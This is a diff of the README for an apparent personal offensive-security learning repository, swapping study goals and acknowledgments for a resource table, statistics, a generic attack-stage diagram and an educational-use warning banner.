-- 🔄 Buffer overflow exploitation
-- 🔄 Python security tool development
-
-**Next Up**:
-- ⏳ Windows privilege escalation
-- ⏳ Post-exploitation techniques
-- ⏳ Malware analysis fundamentals
-
-### Skills Development
-
-| Skill Area | Level | Notes |
-|------------|-------|-------|
-| Web Security | Intermediate | Comfortable with OWASP Top 10 |
-| Network Security | Beginner | Understanding protocols |
-| System Exploitation | Beginner | Basic buffer overflows |
-| Malware Analysis | Not Started | Next phase |
-| Mobile Security | Not Started | Future focus |
-| Cloud Security | Not Started | Future focus |
+| Resource | Link |
+|----------|------|
+| Documentation | [/docs](/docs) |
+| Lab Setup Guide | [/docs/lab-setup](/docs/lab-setup) |
+| Code Examples | [/languages](/languages) |
+| Tools | [/tools](/tools) |
+| Write-ups | [/docs/writeups](/docs/writeups) |
+| Issues | [GitHub Issues](https://github.com/yourusername/offensive-security-lab/issues) |
 
 ---
 
-## 🎯 Learning Goals
+## 📊 Statistics
 
-### Short-term (3 months)
-- [ ] Complete buffer overflow exploitation module
-- [ ] Build custom vulnerability scanner
-- [ ] Solve 10 HackTheBox machines
-- [ ] Document 20 lab exercises
-- [ ] Create defensive tool portfolio
-
-### Medium-term (6-12 months)
-- [ ] Complete web security mastery
-- [ ] Begin malware analysis studies
-- [ ] Contribute to open-source security tools
-- [ ] Start OSCP preparation
-- [ ] Develop personal security blog
-
-### Long-term (1-2 years)
-- [ ] Obtain OSCP certification
-- [ ] Master reverse engineering
-- [ ] Develop specialized expertise (malware/web/network)
-- [ ] Contribute to CVE research
-- [ ] Transition to security role professionally
+```
+Total Code Files: 150+
+Programming Languages: 7
+Lab VMs: 10
+Modules Completed: 6/9
+Hours Invested: 500+
+CTF Challenges Solved: 100+
+```
 
 ---
 
-## 🤝 Acknowledgments
+## 🎓 Learning Progress
 
-This learning journey is built on the shoulders of giants:
-
-- The **information security community** for knowledge sharing
-- **Offensive Security** for hands-on training methodology
-- **OWASP** for web security education
-- **Rapid7** for Metasploit and vulnerable VMs
-- All the **course creators** and **content producers** making security education accessible
-- Every **security researcher** who responsibly discloses vulnerabilities
-
-Special thanks to platforms that make legal, safe learning possible:
-- HackTheBox, TryHackMe, PentesterLab, OverTheWire, and others
+```mermaid
+graph LR
+    A[Reconnaissance] --> B[Exploitation]
+    B --> C[Privilege Escalation]
+    C --> D[Persistence]
+    D --> E[Lateral Movement]
+    E --> F[Exfiltration]
+    F --> G[Cover Tracks]
+```
 
 ---
 
-## 📄 License
+## ⚠️ Final Warning
 
-**Creative Commons Attribution-NonCommercial 4.0 International (CC BY-NC 4.0)**
-
-This work is my personal learning documentation. You're welcome to:
-- Read and learn from my notes
-- Fork for your own learning
-- Reference in your studies
-
-With attribution and non-commercial use only.
-
-Full license: https://creativecommons.org/licenses/by-nc/4.0/
-
----
-
-## 💬 About This Project
-
-This repository represents my commitment to understanding cybersecurity deeply. It's messy at times, because learning is messy. It contains:
-
-- ✅ Things that worked
-- ❌ Things that didn't work
-- 🤔 Things I'm still figuring out
-- 📝 Lots of notes to my future self
-
-**This is not**:
-- A tutorial for hacking systems
-- A collection of exploits
-- Advice for unauthorized testing
-- Professional-grade security tools
-
-**This is**:
-- My personal learning lab
-- Documentation of a security education journey
-- A resource for understanding defense through offense
-- Evidence of continuous learning
+```
+╔═══════════════════════════════════════════════════════════════════╗
+║                                                                   ║
+║  This repository is for EDUCATIONAL PURPOSES ONLY.                ║
+║                                                                   ║
+║  Unauthorized access to computer systems is ILLEGAL.              ║
+║                                                                   ║
+║  Use this knowledge to:                                           ║
+║  ✅ Secure your own systems                                       ║
+║  ✅ Learn ethical hacking                                         ║
+║  ✅ Pursue security certifications                                ║
+║  ✅ Build a career in cybersecurity                               ║
+║                                                                   ║
+║  DO NOT use this to:                                              ║
+║  ❌ Attack systems you don't own                                  ║
+║  ❌ Harm others                                                    ║
+║  ❌ Break the law                                                  ║
+║                                                                   ║
+║  Remember: With great power comes great responsibility.           ║
+║                                                                   ║
+╚═══════════════════════════════════════════════════════════════════╝
+```
 
 ---
 
-## 📞 Contact
+<div align="center">
 
-This is a personal learning project. I'm not offering hacking services or assisting with unauthorized system access.
+**Made with ❤️ for the InfoSec Community**
 
-For questions about this repository or learning approach:
-- Open an issue for technical questions
-- Connect on LinkedIn for professional networking
-- Email for collaboration on educational projects
+⭐ Star this repo if you find it useful!
 
----
+[Report Bug](https://github.com/yourusername/offensive-security-lab/issues) · [Request Feature](https://github.com/yourusername/offensive-security-lab/issues) · [Documentation](https://github.com/yourusername/offensive-security-lab/wiki)
 
-## 🔐 Final Thoughts
-
-> *"Security is not a product, but a process."* - Bruce Schneier
-
-Every vulnerability I study, every exploit I understand, every defense I implement - all of it makes me a better security practitioner. This isn't about breaking things; it's about understanding them so completely that I can protect them.
-
-The journey from curious beginner to competent security professional is long, but rewarding. This repository is my proof of work.
-
-**Stay curious. Stay ethical. Keep learning.**
+</div>
 
 ---
 
-**Version**: 2.0
-**Last Updated**: February 2026
-**Learning Status**: Active & Ongoing
-
----
-
-*"The best defense is a good understanding of offense."*
+**Last Updated:** February 2026  
+**Version:** 1.0.0  
+**Maintained By:** [Your Name]
